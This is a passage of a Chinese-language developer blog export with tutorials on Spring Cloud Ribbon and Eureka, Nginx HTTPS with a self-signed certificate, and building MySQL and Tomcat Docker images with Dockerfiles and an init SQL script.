    <content type="text"><![CDATA[Ribbon 学过Nginx的都知道它是一个服务端负载均衡器，而Ribbon 也是一个负载均衡器，只不过它是基于基于HTTP和TCP的客户端负载均衡器。 代码实现准备工作 1、启动一个eureka服务 2、一个生产者集群，有两个节点（端口7900、端口7901） 3、一个ribbon 客户端 生产者我们用上次的代码即可，下面是ribbon客户端的代码实现。 一、使用默认的负载均衡策略（轮询）1、导入依赖 官方的文档是需要导入spring-cloud-starter-ribbon 依赖，如下图但是呢，我们需要导入的eureka的依赖已经包含了ribbon的依赖所以导入spring-cloud-starter-eureka即可1234&lt;dependency&gt; &lt;groupId&gt;org.springframework.cloud&lt;/groupId&gt; &lt;artifactId&gt;spring-cloud-starter-eureka&lt;/artifactId&gt;&lt;/dependency&gt; 2、加上注解只需要在客户端的RestTemplate bean上加上注解@LoadBalanced即可用默认的负载均衡策略（轮询）。1234567891011121314@SpringBootApplication@EnableEurekaClientpublic class CustomerRibbonApplication &#123; public static void main( String[] args )&#123; SpringApplication.run(CustomerRibbonApplication.class, args); &#125; @Bean @LoadBalanced public RestTemplate restTemlate() &#123; return new RestTemplate(); &#125;&#125; 3、控制层访问生产者常规我们的restTemplate.getForObject()的第一个参数地址是写死的，这里我们写上服务名称 producer即可123456789101112@RestControllerpublic class TestController &#123; @Autowired private RestTemplate restTemplate; @GetMapping(&quot;/provider/&#123;id&#125;&quot;) public Object test(@PathVariable(&quot;id&quot;) String id) &#123; Object obj = restTemplate.getForObject(&quot;http://producer/item/&quot;+id,Object.class); System.out.println(&quot;obj=&quot;+obj.toString()); return obj; &#125; 把生产者和eureka服务与ribbon客户端启之后，我们看看eureka 的服务注册情况 因为我们知道生产者有一个片段代码是长这样的：123456@GetMapping(&quot;/item/&#123;id&#125;&quot;)public Object test(@PathVariable(&quot;id&quot;)String id,HttpServletRequest request) &#123; int port = request.getServerPort(); System.out.println(&quot;item---id,port:&quot;+port); return new Item(id,port+&quot;&quot;);&#125; 然后我们浏览器访问：http://localhost:8901/provider/1刚好调用的是生产者的/item/{id}这个接口，我们可以观察控制台的打印情况，知道负载均衡是否有效,我们多请求几次，然后看控制台的代码如下： 从打印结果知道，我们已经成功实现了负载均衡 还有就是，这个默认的是轮询的负载均衡，我们怎么自定义自己的负载均衡策略，看下面第二种情况 二、自定义负载均衡策略1、创建一个自定义的配置类RuleConfig 这个配置类的路径，不要在启动类的包路径之下 123456789@Configurablepublic class RuleConfig &#123; @Bean public IRule ribbonRule(IClientConfig config) &#123; //RandomRule 是随机策略 return new RandomRule(); &#125; &#125; 2、启动类加注解@RibbonClient注解给哪个服务启动负载均衡策略，参数中的name 是服务名称，configuration 后面跟着是负载均衡自定义配置类12345678910111213141516@Configuration@RibbonClient(name=&quot;producer2&quot;,configuration=RuleConfig.class)@SpringBootApplication@EnableEurekaClientpublic class CustomerRibbonApplication &#123; public static void main( String[] args )&#123; SpringApplication.run(CustomerRibbonApplication.class, args); &#125; @Bean @LoadBalanced public RestTemplate restTemlate() &#123; return new RestTemplate(); &#125;&#125; 3、测试是否生效12345678910111213141516@RestControllerpublic class TestController &#123; @Autowired private LoadBalancerClient loadBalancerClient; @GetMapping(&quot;/test&quot;) public Object test2() &#123; //下面是当前的访问请求producer2服务中，具体选择的是哪个服务 ServiceInstance serverInstance = loadBalancerClient.choose(&quot;producer2&quot;); String result = &quot;====&quot;+serverInstance.getHost()+&quot;:&quot;+serverInstance.getPort(); System.out.println(result); return result; &#125;&#125; eureka 服务注册情况 多次访问：http://localhost:8901/test查看控制台可以知道是随机的，还有一种是，如果我想要producer服务 是默认的，producer2服务是随机的，怎么配置 其实很简单，想要的默认的不需要配置，只配置你想要自定义的即可，如下：随机加轮询 Github代码地址]]></content>
      <categories>
        <category>Java</category>
      </categories>
      <tags>
        <tag>SpringCloud</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[SpringCloud （一）、服务注册与发现]]></title>
    <url>%2Fblog%2F2018%2F05%2F07%2FSpringCloud%20%EF%BC%88%E4%B8%80%EF%BC%89%E3%80%81%E6%9C%8D%E5%8A%A1%E6%B3%A8%E5%86%8C%E4%B8%8E%E5%8F%91%E7%8E%B0%2F</url>
    <content type="text"><![CDATA[微服务架构 “微服务架构” 在之前几年久很火爆了，以至于现在关于微服务的文章很多，资料也是海量，社区同样也是很活跃。 微服务架构 的两大主流 应该就是SpringCloud 与 dubbo 了。 说了那么多，微服务是什么呢？ 简单的说，微服务架构就是将一个完整的应用垂直拆分成多个不同的服务，每个服务都是一个个体，可以独立部署、独立维护、独立扩展、服务与服务之间 通过诸如RESTful API 的方式相互调用。 Spring Cloud 简介Spring Cloud是一个基于Spring Boot实现的云应用开发工具，它为基于JVM的云应用开发中涉及的配置管理、服务发现、断路器、智能路由、微代理、控制总线、全局锁、决策竞选、分布式会话和集群状态管理等操作提供了一种简单的开发方式。 Spring Cloud包含了多个子项目（针对分布式系统中涉及的多个不同开源产品），比如：Spring Cloud Config、Spring Cloud Netflix、Spring Cloud0 CloudFoundry、Spring Cloud AWS、Spring Cloud Security、Spring Cloud Commons、Spring Cloud Zookeeper、Spring Cloud CLI等项目。 Github地址 服务治理 假设现在有两个服务接口 ，一个是生产者（producer）,一个是消费者（customer）,customer 现在要调用producer，可以通过RestTemplate 进行调用，比如 12345@GetMapping(&quot;/provider/&#123;id&#125;&quot;)public Object test(@PathVariable(&quot;id&quot;) String id) &#123; //producerServicePath 是生产者服务提供的接口 return restTemplate.getForObject(producerServicePath+id,Object.class);&#125; 这样就产生一个问题，我们发现producerServicePath 这个地址是写死的，硬编码了，对后期维护是很不方便的。所以需要一个服务注册中心，我们只需要向服务中心请求具体的服务名即可，不需要知道具体的请求地址。这服务注册中心怎么实现呢，Springcloud 支持多种的服务治理框架，比如：Eureka、Consul、Zookeeper….，选一种 那就Eureka 吧。因为啥，因为我喜欢啊。哈哈 Spring Cloud Eureka是Spring Cloud Netflix项目下的服务治理模块。而Spring Cloud Netflix项目是Spring Cloud的子项目之一，主要内容是对Netflix公司一系列开源产品的包装，它为Spring Boot应用提供了自配置的Netflix OSS整合。通过一些简单的注解，开发者就可以快速的在应用中配置一下常用模块并构建庞大的分布式系统。它主要提供的模块包括：服务发现（Eureka），断路器（Hystrix），智能路由（Zuul），客户端负载均衡（Ribbon）等。 创建服务注册中心SpringCloud 有几个版本，我现在用的是Dalston SR5 一、引入依赖12345678910111213141516171819202122232425262728293031323334353637&lt;parent&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter-parent&lt;/artifactId&gt; &lt;version&gt;1.5.12.RELEASE&lt;/version&gt; &lt;relativePath/&gt; &lt;!-- lookup parent from repository --&gt;&lt;/parent&gt; &lt;dependencyManagement&gt; &lt;dependencies&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.cloud&lt;/groupId&gt; &lt;artifactId&gt;spring-cloud-dependencies&lt;/artifactId&gt; &lt;version&gt;Dalston.SR5&lt;/version&gt; &lt;type&gt;pom&lt;/type&gt; &lt;scope&gt;import&lt;/scope&gt; &lt;/dependency&gt; &lt;/dependencies&gt;&lt;/dependencyManagement&gt; &lt;dependencies&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter-test&lt;/artifactId&gt; &lt;scope&gt;test&lt;/scope&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.cloud&lt;/groupId&gt; &lt;artifactId&gt;spring-cloud-starter-eureka-server&lt;/artifactId&gt; &lt;/dependency&gt; &lt;!-- 安全认证 --&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter-security&lt;/artifactId&gt; &lt;/dependency&gt; &lt;/dependencies&gt; 二、加入注解在启动类加入 @EnableEurekaServer 注解,如下例子123456789@SpringBootApplication@EnableEurekaServerpublic class SpringcloudEurekaApplication &#123; public static void main(String[] args) &#123; SpringApplication.run(SpringcloudEurekaApplication.class, args); &#125; &#125; 三、配置application.ymleureka.client.registerWithEureka ：表示是否将自己注册到Eureka Server，默认为true。由于当前这个应用就是Eureka Server，故而设为false。eureka.client.fetchRegistry ：表示是否从Eureka Server获取注册信息，默认为true。因为这是一个单点的Eureka Server，不需要同步其他的Eureka Server节点的数据，故而设为false。eureka.client.serviceUrl.defaultZone ：设置与Eureka Server交互的地址，查询服务和注册服务都需要依赖这个地址。默认是http://localhost:8761/eureka ；多个地址可使用 , 分隔。 Eureka的配置类所在类：123org.springframework.cloud.netflix.eureka.EurekaInstanceConfigBeanorg.springframework.cloud.netflix.eureka.EurekaClientConfigBeanorg.springframework.cloud.netflix.eureka.server.EurekaServerConfigBean 1234567891011121314151617# security 这个的配置是当访问eureka时需要登陆，不要也是可以的security: basic: enabled: true user: name: rstyro password: rstyropwdserver: port: 8761eureka: client: register-with-eureka: false fetch-registry: false service-url: defaultZone: http://rstyro:rstyropwd@localhost:8761/eureka 启动启动，访问: http://localhost:8761/输入用户名（rstyro）密码(rstyropwd) 登陆之后显示如下的界面，说明启动成功看 Instances currently registered with Eureka 是空的，当前还没有什么服务注册进来 创建生产者一、引入依赖123456789101112131415161718192021222324252627282930&lt;parent&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter-parent&lt;/artifactId&gt; &lt;version&gt;1.5.12.RELEASE&lt;/version&gt; &lt;relativePath/&gt; &lt;!-- lookup parent from repository --&gt;&lt;/parent&gt; &lt;dependencyManagement&gt; &lt;dependencies&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.cloud&lt;/groupId&gt; &lt;artifactId&gt;spring-cloud-dependencies&lt;/artifactId&gt; &lt;version&gt;Dalston.SR5&lt;/version&gt; &lt;type&gt;pom&lt;/type&gt; &lt;scope&gt;import&lt;/scope&gt; &lt;/dependency&gt; &lt;/dependencies&gt;&lt;/dependencyManagement&gt;&lt;dependencies&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.cloud&lt;/groupId&gt; &lt;artifactId&gt;spring-cloud-starter-eureka&lt;/artifactId&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter-actuator&lt;/artifactId&gt; &lt;/dependency&gt; &lt;/dependencies&gt; 二、加入注解在启动类加入@EnableEurekaClient注解1234567@SpringBootApplication@EnableEurekaClientpublic class ProducerApplication &#123; public static void main(String[] args) &#123; SpringApplication.run(ProducerApplication.class, args); &#125;&#125; 三、配置application12345678910111213# rstyro:rstyropwd 是在eureka 中配置的用户名和密码，如果不配的话，这里不写eureka: client: serviceUrl: defaultZone: http://rstyro:rstyropwd@localhost:8761/eureka instance: prefer-ip-address: truespring: application: name: producer server: port: 7900 创建消费者和创建生产者的代码是差不多一样的，这里就不写出来了。启动 生产者和消费者，刷新Eureka 界面 发现我们的两个服务已经注册进来了,说明我们的两个服务已经成功注册到Eureka里面去了接下来讲如何不需要写硬编码，使用Ribbon 可以参考：SpringCloud文档 Github代码示例]]></content>
      <categories>
        <category>Java</category>
      </categories>
      <tags>
        <tag>SpringCloud</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Nginx 搭建https]]></title>
    <url>%2Fblog%2F2018%2F01%2F18%2FNginx%20%E6%90%AD%E5%BB%BAhttps%2F</url>
    <content type="text"><![CDATA[nginx 搭建https一、创建SSL证书12mkdir -p /etc/nginx/sslopenssl req -x509 -nodes -days 36500 -newkey rsa:2048 -keyout /etc/nginx/ssl/nginx.key -out /etc/nginx/ssl/nginx.crt 创建了有效期100年，加密强度为RSA2048的SSL密钥key和X509证书文件。 参数说明: req 配置参数-x509指定使用 X.509证书签名请求管理(certificate signing request (CSR)).”X.509” 是一个公钥代表that SSL and TLS adheres to for its key and certificate management. -nodes 告诉OpenSSL生产证书时忽略密码环节.(因为我们需要Nginx自动读取这个文件，而不是以用户交互的形式)。 -days 36500 证书有效期，100年 -newkey rsa:2048 同时产生一个新证书和一个新的SSL key(加密强度为RSA 2048) -keyout SSL输出文件名 -out 证书生成文件名 它会问一些问题。需要注意的是在common name中填入网站域名，如wiki.xby1993.net即可生成该站点的证书，同时也可以使用泛域名如*.xby1993.net来生成所有二级域名可用的网站证书。整个问题应该如下所示: 二、nginx配置 ssl12345678910111213141516# 我下面这个配置是http 和https 都可以用的# 如果只要https的话，把：listen:80 去掉server &#123; listen 80; listen 443 ssl; ssl_certificate /etc/nginx/ssl/nginx.crt; ssl_certificate_key /etc/nginx/ssl/nginx.key; keepalive_timeout 70; server_name 服务器ip; server_tokens off; fastcgi_param HTTPS on; fastcgi_param HTTP_SCHEME https; access_log /var/log/nginx/rstyro.access.log; error_log /var/log/nginx/rstyro.error.log;&#125; 12345附录1、证书格式说明.crt：自签名的证书.csr：证书的请求(用于向证书颁发机构申请crt证书时使用，nginx配置时不会用到).key：SSL Key (分为不带口令和带口令版本)。我们自签名证书配置nginx需要的是.crt证书，和不带口令的SSL Key的.key文件。 123456附录2、可靠的第三方SSL证书颁发机构目前一般市面上针对中小站长和企业的 SSL 证书颁发机构有：StartSSLComodo / 子品牌 Positive SSLGlobalSign / 子品牌 AlphaSSLGeoTrust / 子品牌 RapidSSL 转载自：https://segmentfault.com/a/1190000004976222]]></content>
      <categories>
        <category>开发工具</category>
      </categories>
      <tags>
        <tag>Nginx</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Docker（六）、启动mysql时自动执行脚本]]></title>
    <url>%2Fblog%2F2018%2F01%2F18%2FDocker%EF%BC%88%E5%85%AD%EF%BC%89%E3%80%81%E5%90%AF%E5%8A%A8mysql%E6%97%B6%E8%87%AA%E5%8A%A8%E6%89%A7%E8%A1%8C%E8%84%9A%E6%9C%AC%2F</url>
    <content type="text"><![CDATA[docker 启动mysql时自动执行脚本上次已经运行了一个 tomcat 我们还需要一个数据库，docker 运行一个mysql 是很简单的比如1docker run -d --name testmysql -p 3306:3306 -e MYSQL_ROOT_PASSWORD=root -e MYSQL_DATABASE=admin mysql MYSQL_ROOT_PASSWORD=root，指定 root 用户名密码 root MYSQL_DATABASE=admin 容器运行时创建一个数据库名为 admin但是这样只能获得一个空的数据库，我们需要有数据的数据库，so 其实mysql的官方镜像是支持这个能力的，在容器启动的时候自动执行指定的sql脚本或者shell脚本，我们一起来看看mysql官方镜像的Dockerfile，如下图： 已经设定了ENTRYPOINT，里面会调用/entrypoint.sh这个脚本，我们把镜像pull到本地，再用docker run启动起来，进入容器看看里面的entrypoint.sh这个脚本的内容，有一段内容就是从固定目录下遍历所有的.sh和.sql后缀的文件，然后执行，如下图： 搞清楚原理了，现在我们来实战吧一、创建 Dockerfile 文件1234567891011121314151617# mysql 官方镜像FROM docker.io/mysql#作者MAINTAINER rstyro &lt;rstyro@gmail.com&gt;#定义会被容器自动执行的目录ENV AUTO_RUN_DIR /docker-entrypoint-initdb.d#定义初始化sql文件ENV INIT_SQL admin.sql#把要执行的sql文件放到/docker-entrypoint-initdb.d/目录下，容器会自动执行这个sqlCOPY ./$INIT_SQL $AUTO_RUN_DIR/#给执行文件增加可执行权限RUN chmod a+x $AUTO_RUN_DIR/$INIT_SQL 二、admin.sql 文件123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113DROP DATABASE IF EXISTS `admin`;CREATE DATABASE `admin` character set utf8mb4;USE `admin`;SET FOREIGN_KEY_CHECKS=0;-- ------------------------------ Table structure for `sys_login`-- ----------------------------DROP TABLE IF EXISTS `sys_login`;CREATE TABLE `sys_login` ( `id` int(11) NOT NULL AUTO_INCREMENT, `user_id` int(11) NOT NULL, `last_login_time` timestamp NULL DEFAULT CURRENT_TIMESTAMP ON UPDATE CURRENT_TIMESTAMP COMMENT &apos;最后登录时间&apos;, PRIMARY KEY (`id`)) ENGINE=InnoDB AUTO_INCREMENT=73 DEFAULT CHARSET=utf8mb4;-- ------------------------------ Table structure for `sys_menu`-- ----------------------------DROP TABLE IF EXISTS `sys_menu`;CREATE TABLE `sys_menu` ( `menu_id` int(11) NOT NULL, `parent_id` int(11) DEFAULT NULL, `menu_name` varchar(50) DEFAULT NULL, `menu_url` varchar(50) DEFAULT &apos;#&apos;, `menu_type` enum(&apos;2&apos;,&apos;1&apos;) DEFAULT &apos;2&apos; COMMENT &apos;1 -- 系统菜单，2 -- 业务菜单&apos;, `menu_icon` varchar(50) DEFAULT &apos;#&apos;, `sort_num` int(11) DEFAULT &apos;1&apos;, `user_id` int(11) DEFAULT &apos;1&apos; COMMENT &apos;创建这个菜单的用户id&apos;, `is_del` int(11) DEFAULT &apos;0&apos; COMMENT &apos;1-- 删除状态，0 -- 正常&apos;, `update_time` timestamp NULL DEFAULT CURRENT_TIMESTAMP ON UPDATE CURRENT_TIMESTAMP, `create_time` datetime DEFAULT NULL, PRIMARY KEY (`menu_id`)) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4;-- ------------------------------ Records of sys_menu-- ----------------------------INSERT INTO `sys_menu` VALUES (&apos;1&apos;, &apos;0&apos;, &apos;系统管理&apos;, &apos;#&apos;, &apos;1&apos;, &apos;fa fa-gears&apos;, &apos;1&apos;, &apos;1&apos;, &apos;0&apos;, &apos;2017-09-08 16:15:24&apos;, &apos;2017-09-07 14:52:41&apos;);INSERT INTO `sys_menu` VALUES (&apos;2&apos;, &apos;1&apos;, &apos;菜单管理&apos;, &apos;menu/list&apos;, &apos;1&apos;, &apos;#&apos;, &apos;1&apos;, &apos;1&apos;, &apos;0&apos;, &apos;2017-09-12 11:28:09&apos;, &apos;2017-09-07 14:52:41&apos;);INSERT INTO `sys_menu` VALUES (&apos;3&apos;, &apos;1&apos;, &apos;角色管理&apos;, &apos;role/list&apos;, &apos;1&apos;, null, &apos;2&apos;, &apos;1&apos;, &apos;0&apos;, &apos;2017-09-07 17:58:52&apos;, &apos;2017-09-07 14:52:41&apos;);INSERT INTO `sys_menu` VALUES (&apos;4&apos;, &apos;1&apos;, &apos;用户管理&apos;, &apos;user/list&apos;, &apos;1&apos;, &apos;&apos;, &apos;3&apos;, &apos;1&apos;, &apos;0&apos;, &apos;2017-09-12 09:44:48&apos;, &apos;2017-09-07 14:52:41&apos;);INSERT INTO `sys_menu` VALUES (&apos;5&apos;, &apos;0&apos;, &apos;业务菜单&apos;, &apos;#&apos;, &apos;2&apos;, &apos;fa fa-tasks&apos;, &apos;2&apos;, &apos;1&apos;, &apos;0&apos;, &apos;2017-09-07 14:53:33&apos;, &apos;2017-09-07 14:52:41&apos;);INSERT INTO `sys_menu` VALUES (&apos;6&apos;, &apos;5&apos;, &apos;随便添加的子菜单&apos;, &apos;page/t4&apos;, &apos;2&apos;, &apos;&apos;, &apos;1&apos;, &apos;1&apos;, &apos;0&apos;, &apos;2017-09-14 15:45:28&apos;, &apos;2017-09-07 14:52:41&apos;);-- ------------------------------ Table structure for `sys_role`-- ----------------------------DROP TABLE IF EXISTS `sys_role`;CREATE TABLE `sys_role` ( `role_id` int(11) NOT NULL AUTO_INCREMENT, `role_name` varchar(50) DEFAULT NULL COMMENT &apos;角色名&apos;, `role_desc` varchar(255) DEFAULT NULL, `rights` varchar(255) DEFAULT &apos;0&apos; COMMENT &apos;最大权限的值&apos;, `add_qx` varchar(255) DEFAULT &apos;0&apos;, `del_qx` varchar(255) DEFAULT &apos;0&apos;, `edit_qx` varchar(255) DEFAULT &apos;0&apos;, `query_qx` varchar(255) DEFAULT &apos;0&apos;, `user_id` varchar(10) DEFAULT NULL, `create_time` timestamp NULL DEFAULT CURRENT_TIMESTAMP ON UPDATE CURRENT_TIMESTAMP, PRIMARY KEY (`role_id`)) ENGINE=InnoDB AUTO_INCREMENT=5 DEFAULT CHARSET=utf8mb4;-- ------------------------------ Records of sys_role-- ----------------------------INSERT INTO `sys_role` VALUES (&apos;1&apos;, &apos;管理员&apos;, &apos;管理员权限&apos;, &apos;1267650600228229401496703205375&apos;, &apos;1&apos;, &apos;1&apos;, &apos;126&apos;, &apos;126&apos;, &apos;1&apos;, &apos;2017-09-12 15:38:56&apos;);INSERT INTO `sys_role` VALUES (&apos;2&apos;, &apos;tyro&apos;, &apos;随便创建的随便创建的随便创建的随便创建的随便创建的随便创建的随便创建的随便创建的随便创建的随便创建的&apos;, &apos;94&apos;, &apos;2&apos;, &apos;1&apos;, &apos;4&apos;, &apos;126&apos;, &apos;1&apos;, &apos;2017-09-12 15:44:06&apos;);INSERT INTO `sys_role` VALUES (&apos;3&apos;, &apos;test&apos;, &apos;是测试角色这个是测试角色这个是测试角色这个是测试角色这个是测试角色&apos;, &apos;382&apos;, &apos;382&apos;, &apos;382&apos;, &apos;382&apos;, &apos;126&apos;, &apos;1&apos;, &apos;2017-09-12 15:39:28&apos;);INSERT INTO `sys_role` VALUES (&apos;4&apos;, &apos;查看&apos;, &apos;可以查看所有的东西&apos;, &apos;126&apos;, &apos;0&apos;, &apos;0&apos;, &apos;0&apos;, &apos;126&apos;, &apos;1&apos;, &apos;2017-09-14 17:17:17&apos;);-- ------------------------------ Table structure for `sys_user`-- ----------------------------DROP TABLE IF EXISTS `sys_user`;CREATE TABLE `sys_user` ( `user_id` int(11) NOT NULL AUTO_INCREMENT, `username` varchar(50) DEFAULT NULL, `nick_name` varchar(50) DEFAULT NULL, `password` varchar(50) DEFAULT NULL, `pic_path` varchar(200) DEFAULT &apos;/images/logo.png&apos;, `status` enum(&apos;unlock&apos;,&apos;lock&apos;) DEFAULT &apos;unlock&apos;, `create_time` datetime DEFAULT NULL, PRIMARY KEY (`user_id`)) ENGINE=InnoDB AUTO_INCREMENT=13 DEFAULT CHARSET=utf8mb4;-- ------------------------------ Records of sys_user-- ----------------------------INSERT INTO `sys_user` VALUES (&apos;1&apos;, &apos;admin&apos;, &apos;管理员&apos;, &apos;d033e22ae348aeb5660fc2140aec35850c4da997&apos;, &apos;http://www.lrshuai.top/upload/user/20170612/05976238.png&apos;, &apos;unlock&apos;, &apos;2017-08-18 13:57:32&apos;);INSERT INTO `sys_user` VALUES (&apos;2&apos;, &apos;tyro&apos;, &apos;tyro&apos;, &apos;481c63e8b904bb8399f1fc1dfdb77cb40842eb6f&apos;, &apos;/upload/show/user/82197046.png&apos;, &apos;unlock&apos;, &apos;2017-09-12 14:03:39&apos;);INSERT INTO `sys_user` VALUES (&apos;3&apos;, &apos;asdf&apos;, &apos;asdf&apos;, &apos;3da541559918a808c2402bba5012f6c60b27661c&apos;, &apos;/upload/show/user/85610497.png&apos;, &apos;unlock&apos;, &apos;2017-09-13 14:49:10&apos;);-- ------------------------------ Table structure for `sys_user_role`-- ----------------------------DROP TABLE IF EXISTS `sys_user_role`;CREATE TABLE `sys_user_role` ( `id` int(11) NOT NULL AUTO_INCREMENT, `user_id` int(11) DEFAULT NULL, `role_id` int(11) DEFAULT NULL, `create_time` timestamp NULL DEFAULT CURRENT_TIMESTAMP ON UPDATE CURRENT_TIMESTAMP, PRIMARY KEY (`id`)) ENGINE=InnoDB AUTO_INCREMENT=15 DEFAULT CHARSET=utf8mb4;-- ------------------------------ Records of sys_user_role-- ----------------------------INSERT INTO `sys_user_role` VALUES (&apos;1&apos;, &apos;1&apos;, &apos;1&apos;, &apos;2017-08-18 14:45:43&apos;);INSERT INTO `sys_user_role` VALUES (&apos;2&apos;, &apos;2&apos;, &apos;3&apos;, &apos;2017-09-08 17:12:58&apos;);INSERT INTO `sys_user_role` VALUES (&apos;13&apos;, &apos;3&apos;, &apos;3&apos;, &apos;2017-09-14 14:30:02&apos;); 三、生成新的mysql镜像1docker build -t adminmysql . 四、启动现在启动是可以的，但是呢有一个问题，因为mysql的编码默认是瑞典latin1，我们要把改成utf8 或者utfmb4my.cnf123456789[mysqld]character_set_server=utf8mb4init_connect=&apos;SET NAMES utf8&apos;wait_timeout=1814400interactive_timeout=604800sql_mode=NO_ENGINE_SUBSTITUTION,STRICT_TRANS_TABLES[client]default-character-set=utf8mb4 上面的配置就和mysql 的配置是一样的，可以按照你的需求来配，下面就是启动容器的命令12# 默认密码： root,我们要挂载一个my.cnf 的配置文件docker run --name admin_db -d -p 3306:3306 -e MYSQL_ROOT_PASSWORD=root -v /root/docker-mysql/my.cnf:/etc/mysql/my.cnf adminmysql 查看容器数据库是否有数据 不错是有数据的。我的命令过程 搞定收工参考链接：https://blog.csdn.net/boling_cavalry/article/details/71055159]]></content>
      <categories>
        <category>开发工具</category>
      </categories>
      <tags>
        <tag>Docker</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Docker（五）、制作自己的Docker 镜像]]></title>
    <url>%2Fblog%2F2018%2F01%2F18%2FDocker%EF%BC%88%E4%BA%94%EF%BC%89%E3%80%81%E5%88%B6%E4%BD%9C%E8%87%AA%E5%B7%B1%E7%9A%84Docker%20%E9%95%9C%E5%83%8F%2F</url>
    <content type="text"><![CDATA[制作自己的Docker 镜像Docker 可以通过 Dockerfile 的内容来自动构建镜像。Dockerfile 是一个包含创建镜像所有命令的文本文件，通过docker build命令可以根据 Dockerfile 的内容构建镜像目标：在 tomcat中 运行一个.war 文件一、创建一个Dockerfile 文件12345# 先创建一个文件夹为docker-adminmkdir docker-admin# 进入文件夹docker-admin 并创建一个Dockerfilecd docker-admin &amp;&amp; vim Dockerfile 二、编辑Dockerfile 文件编辑如下内容,下面中的COPY admin.war 的admin.war 就是我们的war文件Dockerfile 的一些基本语法结构 后面再介绍123FROM docker.io/tomcatMAINTAINER rstyroCOPY admin.war /usr/local/tomcat/webapps 三、获取到.war 文件你可以用你自己的，或者用我的12345# github 下载地址为：wget https://github.com/rstyro/admin/raw/pack/pack/admin-0.0.1-SNAPSHOT.war# 修改名字mv admin-0.0.1-SNAPSHOT.war admin.war 四、构建镜像12# -t 参数 后面跟镜像名字和tag 注意别忘了后面的 . 点表示当前路径docker build -t admin:1.0.0 . 五、运行我们刚构建的镜像12# 给它取名 admin 本机端口映射 8080docker run --name=admin -p 8080:8080 -d admin:1.0.0 下面是我敲命令的过程 六、Dockerfile 指令详解 FROM MAINTAINER RUN CMD EXPOSE ENV ADD COPY ENTRYPOINT VOLUME USER WORKDIR ONBUILD 1、FROM用法:1FROM &lt;image&gt; FROM指定构建镜像的基础源镜像，如果本地没有指定的镜像，则会自动从 Docker 的公共库 pull 镜像下来。 FROM必须是 Dockerfile 中非注释行的第一个指令，即一个 Dockerfile 从FROM语句开始。 FROM可以在一个 Dockerfile 中出现多次，如果有需求在一个 Dockerfile 中创建多个镜像。 如果FROM语句没有指定镜像标签，则默认使用latest标签。 2、MAINTAINER用法:1MAINTAINER &lt;name&gt; 指定创建镜像的用户 3、RUNRUN 有两种使用方式1RUN &quot;executable&quot;, &quot;param1&quot;, &quot;param2&quot; 每条RUN指令将在当前镜像基础上执行指定命令，并提交为新的镜像，后续的RUN都在之前RUN提交后的镜像为基础，镜像是分层的，可以通过一个镜像的任何一个历史提交点来创建，类似源码的版本控制。 exec 方式会被解析为一个 JSON 数组，所以必须使用双引号而不是单引号。exec 方式不会调用一个命令 shell，所以也就不会继承相应的变量，如：1RUN [ &quot;echo&quot;, &quot;$HOME&quot; ] 这种方式是不会达到输出 HOME 变量的，正确的方式应该是这样的1RUN [ &quot;sh&quot;, &quot;-c&quot;, &quot;echo&quot;, &quot;$HOME&quot; ] RUN产生的缓存在下一次构建的时候是不会失效的，会被重用，可以使用–no-cache选项，即docker build –no-cache，如此便不会缓存。 4、CMDCMD有三种使用方式:123CMD &quot;executable&quot;,&quot;param1&quot;,&quot;param2&quot;CMD &quot;param1&quot;,&quot;param2&quot;CMD command param1 param2 (shell form) CMD指定在 Dockerfile 中只能使用一次，如果有多个，则只有最后一个会生效。 CMD的目的是为了在启动容器时提供一个默认的命令执行选项。如果用户启动容器时指定了运行的命令，则会覆盖掉CMD指定的命令。 CMD会在启动容器的时候执行，build 时不执行，而RUN只是在构建镜像的时候执行，后续镜像构建完成之后，启动容器就与RUN无关了 5、EXPOSE格式：1EXPOSE &lt;port&gt; [&lt;port&gt;...] 告诉 Docker 服务端容器对外映射的本地端口，需要在 docker run 的时候使用-p或者-P选项生效。 6、ENV12ENV &lt;key&gt; &lt;value&gt; # 只能设置一个变量ENV &lt;key&gt;=&lt;value&gt; ... # 允许一次设置多个变量 指定一个环境变量，会被后续RUN指令使用，并在容器运行时保留。 例子:12ENV myName=&quot;John Doe&quot; myDog=Rex\ The\ Dog \ myCat=fluffy 等同于123ENV myName John DoeENV myDog Rex The DogENV myCat fluffy 7、ADD1ADD &lt;src&gt;... &lt;dest&gt; ADD复制本地主机文件、目录或者远程文件 URLS 从 并且添加到容器指定路径中 。 支持通过 GO 的正则模糊匹配，具体规则可参见 Go filepath.Match 12ADD hom* /mydir/ # adds all files starting with &quot;hom&quot;ADD hom?.txt /mydir/ # ? is replaced with any single character 路径必须是绝对路径，如果 不存在，会自动创建对应目录 路径必须是 Dockerfile 所在路径的相对路径 如果是一个目录，只会复制目录下的内容，而目录本身则不会被复制 8、COPY1COPY &lt;src&gt;... &lt;dest&gt; COPY复制新文件或者目录从 并且添加到容器指定路径中 。用法同ADD，唯一的不同是不能指定远程文件 URLS。 9、ENTRYPOINT12ENTRYPOINT &quot;executable&quot;, &quot;param1&quot;, &quot;param2&quot;ENTRYPOINT command param1 param2 (shell form) 配置容器启动后执行的命令，并且不可被 docker run 提供的参数覆盖，而CMD是可以被覆盖的。如果需要覆盖，则可以使用docker run --entrypoint选项。每个 Dockerfile 中只能有一个ENTRYPOINT，当指定多个时，只有最后一个生效。 Exec form ENTRYPOINT 例子 通过ENTRYPOINT使用 exec form 